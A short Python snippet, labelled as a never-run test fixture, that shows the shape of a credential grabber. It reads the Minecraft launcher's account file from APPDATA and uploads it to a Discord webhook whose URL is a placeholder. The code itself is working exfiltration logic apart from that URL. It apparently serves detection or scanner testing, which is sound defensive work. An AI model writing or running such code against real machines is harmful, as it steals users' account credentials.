# Python grabber shape: reads the vanilla launcher's account store and posts it to
# a Discord webhook. Dummy webhook; static test data, never run.
import os
import requests

path = os.path.join(os.getenv("APPDATA"), ".minecraft", "launcher_accounts.json")
requests.post("https://discord.com/api/webhooks/0/FIXTURE-NOT-A-REAL-WEBHOOK", files={"f": open(path, "rb")})
